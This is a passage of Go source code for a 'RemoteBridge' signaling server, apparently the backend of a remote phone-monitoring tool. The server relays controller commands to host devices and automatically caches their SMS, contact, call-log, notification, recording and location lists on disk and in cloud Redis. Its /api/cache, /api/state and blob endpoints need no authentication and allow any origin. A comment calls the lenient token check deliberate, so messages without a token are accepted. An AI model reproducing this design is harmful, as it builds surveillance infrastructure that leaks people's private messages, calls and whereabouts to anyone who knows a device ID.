package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type Client struct {
	ID      string          `json:"deviceId"`
	Role    string          `json:"role"`
	Name    string          `json:"deviceName"`
	Token   string          `json:"-"`
	Socket  *websocket.Conn `json:"-"`
	ConnectedAt time.Time   `json:"-"`
}

type HostInfo struct {
	DeviceID   string `json:"deviceId"`
	DeviceName string `json:"deviceName"`
	Online     bool   `json:"online"`
}

type OfferState struct {
	From      string
	Timestamp time.Time
}

type Hub struct {
	mu            sync.RWMutex
	clients       map[string]*Client
	clientTokens  map[string]string
	pendingOffers map[string]*OfferState
}

var hub = Hub{
	clients:       make(map[string]*Client),
	clientTokens:  make(map[string]string),
	pendingOffers: make(map[string]*OfferState),
}

// 🗄️ مخزن لقطات الحالة الصغيرة (في الذاكرة فقط): تبقى البيانات متاحة
// للمتحكم (الموقع/التسميات/آخر ظهور/بطارية) حتى لو انقطع المضيف عن الاتصال.
// Render الخدمة ذات ذاكرة مؤقتة — بعد إعادة النشر تبدأ من متجر فارغ وهذا مقبول.
var (
	stateMu   sync.RWMutex
	stateData = make(map[string]*StateSnapshot)
)

type StateSnapshot struct {
	DeviceID   string          `json:"deviceId"`
	Role       string          `json:"role,omitempty"`
	Name       string          `json:"name,omitempty"`
	Ts         int64           `json:"ts"`
	Online     bool            `json:"online"`
	Battery    int             `json:"batteryLevel"`
	Charging   bool            `json:"isCharging"`
	ReceivedAt time.Time       `json:"-"`
	Data       json.RawMessage `json:"data,omitempty"`
}

const maxStateSnapshots = 64

func upsertStateSnapshot(s *StateSnapshot) {
	stateMu.Lock()
	stateData[s.DeviceID] = s
	if len(stateData) > maxStateSnapshots {
		// إزالة اللقطة الأقدم عند التحاكي السعة
		var oldestKey string
		var oldest time.Time
		first := true
		for k, v := range stateData {
			if first || v.ReceivedAt.Before(oldest) {
				oldest = v.ReceivedAt
				oldestKey = k
				first = false
			}
		}
		if oldestKey != s.DeviceID && oldestKey != "" {
			delete(stateData, oldestKey)
		}
	}
	stateMu.Unlock()
}

// ==========================================================
// 🗄️ B12 — مخزن "البيانات المخزنة على الخادم" (كاش القوائم التلقائي)
// كل رد مضيف لأوامر القوائم ضمن القائمة البيضاء يُحفظ في الذاكرة
// ويُفرَّغ دورياً إلى ملف cache_store/cache.json لتجيّده بعد
// إعادة نشر خادم render (الحاوية نفسها في مدة الدورّة تظل منفضة تماماً).
// يعرض المتحكم هذه القوائم في نافذة "البيانات المخزنة على الخادم"
// حتى وإن لم يُعاينها لحظتها أو انقطع المضيف عن الإنترنت.
// ==========================================================
type cacheEntry struct {
	Ts   int64           `json:"ts"`
	Data json.RawMessage `json:"data"`
}

var (
	cacheMu    sync.RWMutex
	cacheData  = make(map[string]map[string]*cacheEntry) // deviceID -> cmd -> entry
	cacheDirty = false
)

const (
	cacheCmdLimit   = 4 << 20 // 4MB لأقصى حجم لعنصر قائمة واحد
	cacheTotalLimit = 48 << 20
	cacheMaxDevices = 64
)

// أمر القوائم المخزّنة تلقائياً عند عبورها الخادم
func isCachedCommand(cmd string) bool {
	switch cmd {
	case "contacts_list", "sms_list", "calls_list", "notifications_list",
		"recordings_list", "media_items", "media_folders", "locations_get",
		"locations_archive_list":
		return true
	}
	return false
}

func cacheSnapshot(deviceID, cmd string, data json.RawMessage) {
	if len(data) > cacheCmdLimit || len(data) < 2 {
		return
	}
	cacheMu.Lock()
	defer cacheMu.Unlock()
	if _, exists := cacheData[deviceID]; !exists && len(cacheData) >= cacheMaxDevices {
		return
	}
	if cacheData[deviceID] == nil {
		cacheData[deviceID] = make(map[string]*cacheEntry)
	}
	cacheData[deviceID][cmd] = &cacheEntry{Ts: time.Now().UnixMilli(), Data: data}
	cacheDirty = true
	scheduleCloudSync()
}

// 💾 تفريغ الكاش إلى القرص كل 5 دقائق إذا تحّر، وتحميله عند الإقلاع
func cacheDiskPath() string { return filepath.Join("cache_store", "cache.json") }

func periodicCacheDump() {
	for {
		time.Sleep(5 * time.Minute)
		cacheMu.RLock()
		dirty := cacheDirty
		var out map[string]map[string]*cacheEntry
		if dirty {
			out = make(map[string]map[string]*cacheEntry)
			for d, cmds := range cacheData {
				cp := make(map[string]*cacheEntry)
				for c, e := range cmds {
					cp[c] = &cacheEntry{Ts: e.Ts, Data: json.RawMessage(append([]byte(nil), e.Data...))}
				}
				out[d] = cp
			}
		}
		cacheMu.RUnlock()
		if !dirty || out == nil {
			continue
		}
		p := cacheDiskPath()
		if dir := filepath.Dir(p); dir != "" {
			_ = os.MkdirAll(dir, 0o755)
		}
		b, err := json.Marshal(out)
		if err != nil {
			continue
		}
		tmp := p + ".tmp"
		if err := os.WriteFile(tmp, b, 0o644); err == nil {
			_ = os.Rename(tmp, p)
			cacheMu.Lock()
			cacheDirty = false
			cacheMu.Unlock()
			log.Printf("تم تفريغ كاش القوائم إلى القرص: %d مضيف", len(out))
			syncCacheToCloud(false)
		}
	}
}

func loadCacheFromDisk() {
	p := cacheDiskPath()
	b, err := os.ReadFile(p)
	if err != nil || len(b) < 2 {
		return
	}
	var loaded map[string]map[string]*cacheEntry
	if err := json.Unmarshal(b, &loaded); err != nil || loaded == nil {
		return
	}
	cacheMu.Lock()
	cacheData = loaded
	cacheMu.Unlock()
	log.Printf("تم تحميل كاش القوائم من القرص: %d مضيف", len(loaded))
}

// ——— B12-r2: تخزين سحابي اختياري للكاش (Upstash Redis REST) ———
// حدّ Render المجاني: القرص مؤقت والخدمة تسكون بعد 15 دقيقة خمولاً —
// وعند الاستيقاظ/إعادة النشر تبدأ الحاوية بملف نظام ممسوح. الحل: عند تعريف
// UPSTASH_REDIS_REST_URL وUPSTASH_REDIS_REST_TOKEN في لوحة Render
// يُحفظ الكاش في Redis سحابي دائم (الخطة المجانية تكفي تطبيقاً واحداً)،
// ويعاد دمجه عند كل إقلاع: المدخل الأحدث زمنياً هو الفائز. بدون المتغيرات
// يعمل النظام كما كان (ذاكرة + قرص) دون أي أثر جانبي.
const (
	cacheCloudKey     = "rb_cache_v1"
	cloudSyncDebounce = 15 * time.Second
)

var (
	upstashRESTURL   = strings.TrimRight(strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_URL")), "/")
	upstashRESTToken = strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_TOKEN"))
	cloudSyncMu      sync.Mutex
	cloudDirty       = true
	cloudSyncTimer   *time.Timer
)

func upstashEnabled() bool {
	return upstashRESTURL != "" && upstashRESTToken != ""
}

func upstashSet(key, value string) error {
	req, err := http.NewRequest(http.MethodPost, upstashRESTURL+"/set/"+key, strings.NewReader(value))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+upstashRESTToken)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("status %d", resp.StatusCode)
	}
	return nil
}

func upstashGet(key string) (string, error) {
	req, err := http.NewRequest(http.MethodGet, upstashRESTURL+"/get/"+key, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+upstashRESTToken)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status %d", resp.StatusCode)
	}
	var parsed struct {
		Result *string `json:"result"`
	}
	if err := json.Unmarshal(b, &parsed); err != nil {
		return "", err
	}
	if parsed.Result == nil {
		return "", nil
	}
	return *parsed.Result, nil
}

// scheduleCloudSync يجمع دفعة التغييرات المتتالية ويرفعها دفعة واحدة بعد 15 ثانية هدوء
func scheduleCloudSync() {
	if !upstashEnabled() {
		return
	}
	cloudSyncMu.Lock()
	cloudDirty = true
	if cloudSyncTimer != nil {
		cloudSyncTimer.Stop()
	}
	cloudSyncTimer = time.AfterFunc(cloudSyncDebounce, func() { syncCacheToCloud(false) })
	cloudSyncMu.Unlock()
}

// syncCacheToCloud يرفع لقطة الكاش كاملة (نفس بنية ملف القرص) إلى Redis السحابي
func syncCacheToCloud(force bool) {
	if !upstashEnabled() {
		return
	}
	cloudSyncMu.Lock()
	if !cloudDirty && !force {
		cloudSyncMu.Unlock()
		return
	}
	cloudDirty = false
	cloudSyncMu.Unlock()

	cacheMu.RLock()
	out := make(map[string]map[string]*cacheEntry, len(cacheData))
	for d, cmds := range cacheData {
		cp := make(map[string]*cacheEntry, len(cmds))
		for c, e := range cmds {
			cp[c] = &cacheEntry{Ts: e.Ts, Data: json.RawMessage(append([]byte(nil), e.Data...))}
		}
		out[d] = cp
	}
	cacheMu.RUnlock()

	b, err := json.Marshal(out)
	if err != nil {
		return
	}
	if err := upstashSet(cacheCloudKey, string(b)); err != nil {
		log.Printf("تعذّر رفع كاش القوائم إلى التخزين السحابي (يعاد في الدورة القادمة): %v", err)
		cloudSyncMu.Lock()
		cloudDirty = true
		cloudSyncMu.Unlock()
		return
	}
	log.Printf("رُفع كاش القوائم إلى التخزين السحابي: %d مضيف (%d بايت)", len(out), len(b))
}

// loadCacheFromCloud يدمج النسخة السحابية مع الموجودة في الذاكرة (الأحدث زمنياً فائز)
func loadCacheFromCloud() {
	if !upstashEnabled() {
		log.Printf("التخزين السحابي للكاش غير مهيأ (متغيرا UPSTASH غير معرفين) — الاعتماد على الذاكرة والقرص")
		return
	}
	raw, err := upstashGet(cacheCloudKey)
	if err != nil {
		log.Printf("تعذّرت قراءة الكاش السحابي: %v", err)
		return
	}
	if raw == "" {
		log.Printf("لا نسخة سحابية للكاش بعد")
		return
	}
	var loaded map[string]map[string]*cacheEntry
	if err := json.Unmarshal([]byte(raw), &loaded); err != nil || loaded == nil {
		log.Printf("نسخة الكاش السحابية غير سليمة")
		return
	}
	merged := 0
	cacheMu.Lock()
	for d, cmds := range loaded {
		if cacheData[d] == nil && len(cacheData) >= cacheMaxDevices {
			continue
		}
		if cacheData[d] == nil {
			cacheData[d] = make(map[string]*cacheEntry)
		}
		for c, e := range cmds {
			if !isCachedCommand(c) {
				continue
			}
			if cur, ok := cacheData[d][c]; !ok || cur.Ts < e.Ts {
				cacheData[d][c] = e
				merged++
			}
		}
	}
	cacheMu.Unlock()
	log.Printf("استُعيدت %d مدخلات كاش من التخزين السحابي", merged)
}

func handleCacheAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodGet {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "روشت غير مدعوم"})
		return
	}
	deviceID := r.URL.Query().Get("deviceId")
	cmd := r.URL.Query().Get("cmd")
	w.Header().Set("Content-Type", "application/json")
	if deviceID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "مطلوب deviceId"})
		return
	}
	cacheMu.RLock()
	defer cacheMu.RUnlock()
	cmds, ok := cacheData[deviceID]
	if !ok || cmds == nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"ok":    false,
			"error": "لم تُحفظ قوائم لهذا المضيف بعد",
		})
		return
	}
	if cmd == "" {
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"deviceId": deviceID,
			"cache":    cmds,
			"ts":       time.Now().UnixMilli(),
		})
	} else {
		e, found := cmds[cmd]
		if !found || e == nil {
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": "لا كاش لهذا الأمر"})
			return
		}
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"deviceId": deviceID,
			"cmd":      cmd,
			"ts":       e.Ts,
			"data":     e.Data,
		})
	}
}

// Prometheus metrics
var (
	wsConnections = promauto.NewGauge(prometheus.GaugeOpts{
		Name: "signaling_ws_connections_total",
		Help: "Current WebSocket connections",
	})
	messagesRelayed = promauto.NewCounterVec(prometheus.CounterOpts{
		Name: "signaling_messages_relayed_total",
		Help: "Messages relayed by type",
	}, []string{"type", "status"})
	iceCandidatesRelayed = promauto.NewCounter(prometheus.CounterOpts{
		Name: "signaling_ice_candidates_relayed_total",
		Help: "ICE candidates relayed",
	})
	handshakeDuration = promauto.NewHistogram(prometheus.HistogramOpts{
		Name:    "signaling_handshake_duration_seconds",
		Help:    "Time from Offer to Answer",
		Buckets: prometheus.DefBuckets,
	})
	rpcRequests = promauto.NewCounterVec(prometheus.CounterOpts{
		Name: "signaling_rpc_requests_total",
		Help: "RPC requests relayed",
	}, []string{"cmd", "status"})
)

func generateToken() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		log.Printf("Failed to generate token: %v", err)
		return ""
	}
	return base64.URLEncoding.EncodeToString(b)
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}

	// Health endpoint
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		hub.mu.RLock()
		hostCount := 0
		controllerCount := 0
		for _, c := range hub.clients {
			if c.Role == "host" {
				hostCount++
			} else if c.Role == "controller" {
				controllerCount++
			}
		}
		hub.mu.RUnlock()

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":       "healthy",
			"timestamp":    time.Now().UnixMilli(),
			"hosts":        hostCount,
			"controllers":  controllerCount,
			"total":        len(hub.clients),
			"uptime_ms":    time.Since(startTime).Milliseconds(),
		})
	})

	// Metrics endpoint (Prometheus)
	http.HandleFunc("/metrics", promhttp.Handler().ServeHTTP)

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// استضافة لوحة التحكم الثابتة إن كان ملفها موجوداً بمظروف النشر
		index := filepath.Join("web-dashboard", "index.html")
		if _, err := os.Stat(index); err == nil {
			w.Header().Set("Access-Control-Allow-Origin", "*")
			http.ServeFile(w, r, index)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"service": "RemoteBridge Signaling Server",
			"status":  "active",
			"version": "2.0.0",
			"endpoints": map[string]string{
				"/health":    "Health check",
				"/metrics":   "Prometheus metrics",
				"/ws":        "WebSocket signaling",
				"/api/state": "State snapshots (POST/GET)",
			},
		})
	})

	http.HandleFunc("/ws", handleWebSocket)
	http.HandleFunc("/api/state", handleStateAPI)
	// B12 — البيانات المخزنة على الخادم: آخر ردود قوائم المضيف تُحفظ تلقائياً وتُقدَّم للمتحكم
	http.HandleFunc("/api/cache", handleCacheAPI)
	http.HandleFunc("/api/blob", handleBlobAPI)
	// B6: مسار القائمة التي تعتمد عليها لوحة الخزنة ونافذة الحالة في لوحة التحكم (كان يُرجع 404 صامتاً)
	http.HandleFunc("/api/blob/list", handleBlobListAPI)

	// B12 — البيانات المخزنة على الخادم: كاش القوائم التلقائي (تحميل من القرص + تفريغ دوري)
	loadCacheFromDisk()
	loadCacheFromCloud()
	go periodicCacheDump()
	go syncCacheToCloud(false) // رفع أولي بعد استرجاع النسخ لضمان وجود نسخة سحابية حتى دون تحديثات

	addr := "0.0.0.0:" + port
	log.Printf("RemoteBridge Signaling Server starting on %s", addr)
	log.Printf("Health: http://%s/health", addr)
	log.Printf("Metrics: http://%s/metrics", addr)

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("ListenAndServe error: %v", err)
	}
}

var startTime = time.Now()

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Upgrade error:", err)
		return
	}
	defer conn.Close()

	var currentDeviceID string
	var authToken string
	var currentRole string

	defer func() {
		if currentDeviceID != "" {
			hub.mu.Lock()
			delete(hub.clients, currentDeviceID)
			delete(hub.clientTokens, currentDeviceID)
			hub.mu.Unlock()
			if currentRole == "host" {
				broadcastHostOffline(currentDeviceID)
			}
			wsConnections.Dec()
		}
	}()

	wsConnections.Inc()

	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var base map[string]interface{}
		if err := json.Unmarshal(msgBytes, &base); err != nil {
			continue
		}

		msgType, _ := base["type"].(string)

		// المصادقة عند التسجيل
		if msgType == "register" {
			var reg struct {
				DeviceID   string `json:"deviceId"`
				Role       string `json:"role"`
				DeviceName string `json:"deviceName"`
				Token      string `json:"token,omitempty"`
			}
			if err := json.Unmarshal(msgBytes, &reg); err != nil {
				continue
			}

			currentDeviceID = reg.DeviceID
			currentRole = reg.Role

			// التحقق من التوكن للأجهزة المسجلة مسبقاً
			hub.mu.RLock()
			expectedToken, exists := hub.clientTokens[reg.DeviceID]
			hub.mu.RUnlock()

			if exists && expectedToken != "" && reg.Token != expectedToken {
				conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"error","message":"Invalid authentication token"}`))
				continue
			}

			// إنشاء توكن جديد للجلسات اللاحقة
			newToken := generateToken()
			if newToken == "" {
				newToken = base64.URLEncoding.EncodeToString([]byte(reg.DeviceID + time.Now().String()))
			}
			authToken = newToken

			client := &Client{
				ID:         reg.DeviceID,
				Role:       reg.Role,
				Name:       reg.DeviceName,
				Token:      authToken,
				Socket:     conn,
				ConnectedAt: time.Now(),
			}

			hub.mu.Lock()
			hub.clients[reg.DeviceID] = client
			hub.clientTokens[reg.DeviceID] = authToken
			hub.mu.Unlock()

			resp, _ := json.Marshal(map[string]interface{}{
				"type":  "registered",
				"ok":    true,
				"token": authToken,
			})
			conn.WriteMessage(websocket.TextMessage, resp)

			if reg.Role == "host" {
				broadcastHostOnline(reg.DeviceID, reg.DeviceName)
			} else if reg.Role == "controller" {
				sendHostList(conn)
			}
			continue
		}

        // التحقق من التوكن للرسائل اللاحقة (إلا إذا كان ping)
        if currentDeviceID != "" && msgType != "ping" {
            hub.mu.RLock()
            expectedToken := hub.clientTokens[currentDeviceID]
            hub.mu.RUnlock()

            var msgEnvelope struct {
                Token string `json:"token"`
            }
            _ = json.Unmarshal(msgBytes, &msgEnvelope)
            // تساهل مقصود: يُرفض فقط التوكن الحاضر والخاطئ — العميلات القديمة بلا توكن تنجح
            if expectedToken != "" && msgEnvelope.Token != "" && msgEnvelope.Token != expectedToken {
                continue // تجاهل الرسائل غير المصادق عليها
            }
        }

		// استخراج meta للرسائل الموجهة
		var meta struct {
			From string `json:"from"`
			To   string `json:"to"`
		}
		_ = json.Unmarshal(msgBytes, &meta)

		switch msgType {
		case "offer":
			handshakeStart := time.Now()
			hub.mu.Lock()
			hub.pendingOffers[meta.To] = &OfferState{From: meta.From, Timestamp: handshakeStart}
			hub.mu.Unlock()
			if relayMessage(msgBytes, meta.To) {
				messagesRelayed.WithLabelValues("offer", "success").Inc()
			} else {
				messagesRelayed.WithLabelValues("offer", "target_offline").Inc()
				// إرسال رفض للمرسل إذا الهدف غير متصل
				var offerMeta struct {
					From string `json:"from"`
				}
				_ = json.Unmarshal(msgBytes, &offerMeta)
				rejectResp, _ := json.Marshal(map[string]interface{}{
					"type":   "reject",
					"from":   meta.To,
					"to":     offerMeta.From,
					"reason": "الجهاز المضيف [" + meta.To + "] غير متصل بخادم الإشارات حالياً",
				})
				conn.WriteMessage(websocket.TextMessage, rejectResp)
			}

		case "answer":
			hub.mu.Lock()
			if state, ok := hub.pendingOffers[meta.To]; ok {
				handshakeDuration.Observe(time.Since(state.Timestamp).Seconds())
				delete(hub.pendingOffers, meta.To)
			}
			hub.mu.Unlock()
			if relayMessage(msgBytes, meta.To) {
				messagesRelayed.WithLabelValues("answer", "success").Inc()
			} else {
				messagesRelayed.WithLabelValues("answer", "target_offline").Inc()
			}

		case "ice":
			if relayMessage(msgBytes, meta.To) {
				iceCandidatesRelayed.Inc()
				messagesRelayed.WithLabelValues("ice", "success").Inc()
			} else {
				messagesRelayed.WithLabelValues("ice", "target_offline").Inc()
			}

		case "rpc_request":
			var reqMeta struct {
				From      string `json:"from"`
				RequestID int    `json:"requestId"`
				Cmd       string `json:"cmd"`
			}
			_ = json.Unmarshal(msgBytes, &reqMeta)

			if relayMessage(msgBytes, meta.To) {
				rpcRequests.WithLabelValues(reqMeta.Cmd, "success").Inc()
			} else {
				rpcRequests.WithLabelValues(reqMeta.Cmd, "target_offline").Inc()
				errResp, _ := json.Marshal(map[string]interface{}{
					"type":      "rpc_response",
					"from":      meta.To,
					"to":        reqMeta.From,
					"requestId": reqMeta.RequestID,
					"cmd":       reqMeta.Cmd,
					"ok":        false,
					"error":     "الجهاز [" + meta.To + "] غير متصل حالياً بخادم الإشارات",
				})
				conn.WriteMessage(websocket.TextMessage, errResp)
			}

		case "rpc_response":
			// 🗄️ B12 — أرشفة تلقائية: آخر رد لكل أمر من قائمة القائمة البيضاء
			// يُخزم في كاش الخادم ليواجه المتحكم لطفاً "البيانات المخزنة على الخادم"
			var respProbe struct {
				From string          `json:"from"`
				Data json.RawMessage `json:"data"`
			}
			if json.Unmarshal(msgBytes, &respProbe) == nil && len(respProbe.Data) > 2 {
				var cmdProbe struct {
					Cmd string `json:"cmd"`
				}
				if json.Unmarshal(respProbe.Data, &cmdProbe) == nil && cmdProbe.Cmd != "" && isCachedCommand(cmdProbe.Cmd) && respProbe.From != "" {
					cacheSnapshot(respProbe.From, cmdProbe.Cmd, respProbe.Data)
				}
			}
			if relayMessage(msgBytes, meta.To) {
				messagesRelayed.WithLabelValues("rpc_response", "success").Inc()
			} else {
				messagesRelayed.WithLabelValues("rpc_response", "target_offline").Inc()
			}

		case "reject":
			relayMessage(msgBytes, meta.To)
			messagesRelayed.WithLabelValues("reject", "success").Inc()

		case "ping":
			resp, _ := json.Marshal(map[string]interface{}{
				"type": "pong",
				"t":    time.Now().UnixMilli(),
			})
			conn.WriteMessage(websocket.TextMessage, resp)

		default:
			// لا نُهدر رسائل مخصصة: كل نوع غير معروف لكنه منسوب لجهاز يُحوَّل كما هو
			if meta.To != "" {
				if relayMessage(msgBytes, meta.To) {
					messagesRelayed.WithLabelValues(msgType, "success").Inc()
				} else {
					messagesRelayed.WithLabelValues(msgType, "target_offline").Inc()
				}
			} else {
				messagesRelayed.WithLabelValues(msgType, "unknown").Inc()
			}
		}
	}
}

func relayMessage(msgBytes []byte, to string) bool {
	hub.mu.RLock()
	target, ok := hub.clients[to]
	hub.mu.RUnlock()

	if ok && target.Socket != nil {
		err := target.Socket.WriteMessage(websocket.TextMessage, msgBytes)
		if err != nil {
			log.Printf("Failed to send to %s: %v", to, err)
			return false
		}
		return true
	}
	return false
}

func sendHostList(conn *websocket.Conn) {
	hub.mu.RLock()
	var hosts []HostInfo
	for _, c := range hub.clients {
		if c.Role == "host" {
			hosts = append(hosts, HostInfo{
				DeviceID:   c.ID,
				DeviceName: c.Name,
				Online:     true,
			})
		}
	}
	hub.mu.RUnlock()

	msg, _ := json.Marshal(map[string]interface{}{
		"type":  "hosts",
		"hosts": hosts,
		"count": len(hosts),
		"ts":    time.Now().UnixMilli(),
	})
	conn.WriteMessage(websocket.TextMessage, msg)
}

func broadcastHostOnline(deviceID, deviceName string) {
	hub.mu.RLock()
	msg, _ := json.Marshal(map[string]interface{}{
		"type": "host_online",
		"host": HostInfo{
			DeviceID:   deviceID,
			DeviceName: deviceName,
			Online:     true,
		},
		"ts": time.Now().UnixMilli(),
	})
	hub.mu.RUnlock()

	hub.mu.RLock()
	defer hub.mu.RUnlock()
	for _, c := range hub.clients {
		if c.Role == "controller" && c.Socket != nil {
			if err := c.Socket.WriteMessage(websocket.TextMessage, msg); err != nil {
				log.Printf("Failed to broadcast host_online to %s: %v", c.ID, err)
			}
		}
	}
}

func broadcastHostOffline(deviceID string) {
	hub.mu.RLock()
	msg, _ := json.Marshal(map[string]interface{}{
		"type":     "host_offline",
		"deviceId": deviceID,
		"ts":       time.Now().UnixMilli(),
	})
	hub.mu.RUnlock()

	hub.mu.RLock()
	defer hub.mu.RUnlock()
	for _, c := range hub.clients {
		if c.Role == "controller" && c.Socket != nil {
			if err := c.Socket.WriteMessage(websocket.TextMessage, msg); err != nil {
				log.Printf("Failed to broadcast host_offline to %s: %v", c.ID, err)
			}
		}
	}
}

// تنظيف العروض المعلقة قديمة (كل دقيقة)
func cleanupPendingOffers() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		hub.mu.Lock()
		now := time.Now()
		for id, state := range hub.pendingOffers {
			if now.Sub(state.Timestamp) > 5*time.Minute {
				delete(hub.pendingOffers, id)
			}
		}
		hub.mu.Unlock()
	}
}

func init() {
	go cleanupPendingOffers()
}

// 🌐 POST/GET /api/state — خزّان لقطات الحالة الصغيرة للمضيف/المتحكم.
func handleStateAPI(w http.ResponseWriter, r *http.Request) {	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	switch r.Method {
	case http.MethodPost:
		r.Body = http.MaxBytesReader(w, r.Body, int64(6)<<20)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			writeStateJSONError(w, http.StatusBadRequest, "فشل قراءة الجسم")
			return
		}
		var req struct {
			DeviceID string          `json:"deviceId"`
			Role     string          `json:"role"`
			Name     string          `json:"name"`
			Online   *bool           `json:"online"`
			Battery  *int            `json:"batteryLevel"`
			Charging *bool           `json:"isCharging"`
			Data     json.RawMessage `json:"data"`
		}
		if err := json.Unmarshal(body, &req); err != nil || req.DeviceID == "" {
			writeStateJSONError(w, http.StatusBadRequest, "بيانات غير صالحة أو deviceId مفقود")
			return
		}
		s := &StateSnapshot{
			DeviceID:   req.DeviceID,
			Role:       req.Role,
			Name:       req.Name,
			Ts:         time.Now().UnixMilli(),
			Online:     true,
			Battery:    -1,
			ReceivedAt: time.Now(),
			Data:       req.Data,
		}
		if req.Online != nil {
			s.Online = *req.Online
		}
		if req.Battery != nil {
			s.Battery = *req.Battery
		}
		if req.Charging != nil {
			s.Charging = *req.Charging
		}
		upsertStateSnapshot(s)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "ts": s.Ts})

	case http.MethodGet:
		deviceID := r.URL.Query().Get("deviceId")
		if deviceID == "" {
			writeStateJSONError(w, http.StatusBadRequest, "deviceId مطلوب")
			return
		}
		stateMu.RLock()
		s, ok := stateData[deviceID]
		stateMu.RUnlock()
		if !ok || s == nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"ok":    false,
				"error": "لا توجد حالة محفوظة لهذا الجهاز",
			})
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s)

	default:
		writeStateJSONError(w, http.StatusMethodNotAllowed, "طريقة غير مدعومة")
	}
}

func writeStateJSONError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": message})
}

// ==========================================================================
//  B4 — مخزن الملفات المشفرة (Blob Store) لمزامنة بيانات المضيف إلى خادم Render
//  المضيف يرفع: لقطات مشفرة (موقع/مكالمات/إشعارات/حالة الشبكة) + تسجيلات المكالمات والبث.
//  التكرار ممنوع: يمنع التحقق sha256 رفع محتوى مطابق مفعلاً (dedup)، والحذف
//  والجلب المُكرر مستبعدان لاحقاً بمقارنة sha256 في قائمة الملفات.
//  ذاكرة in-process حتى 48MB لكل جهاز (قابلة للترقية لاحقاً إلى تخزين دائم).
// ==========================================================================

type BlobItem struct {
	Name   string `json:"name"`
	Kind   string `json:"kind"`
	Sha256 string `json:"sha256"`
	Size   int64  `json:"size"`
	Ts     int64  `json:"ts"`
	Data   []byte `json:"-"`
}

var (
	blobMu    sync.RWMutex
	blobData  = map[string]map[string]map[string]*BlobItem{} // device -> kind -> name -> item
	blobBytes = map[string]int64{}                           // device -> total bytes
)

const blobMaxPerDevice = int64(48) << 20
const blobMaxItem = int64(32) << 20

func blobTrack(deviceID string, item *BlobItem, prev *BlobItem) {
	delta := item.Size
	if prev != nil {
		delta -= prev.Size
	}
	blobBytes[deviceID] += delta
	// طرد الأقدم لو تجاوزنا الحد
	for blobBytes[deviceID] > blobMaxPerDevice {
		var oldestKind, oldestName string
		var oldestTs int64 = math.MaxInt64
		for kind, items := range blobData[deviceID] {
			for name, it := range items {
				if it.Ts < oldestTs {
					oldestTs, oldestKind, oldestName = it.Ts, kind, name
				}
			}
		}
		if oldestTs == math.MaxInt64 || (oldestKind == item.Kind && oldestName == item.Name) {
			break // حماية من التخارج
		}
		evict := blobData[deviceID][oldestKind][oldestName]
		blobBytes[deviceID] -= evict.Size
		delete(blobData[deviceID][oldestKind], oldestName)
		if len(blobData[deviceID][oldestKind]) == 0 {
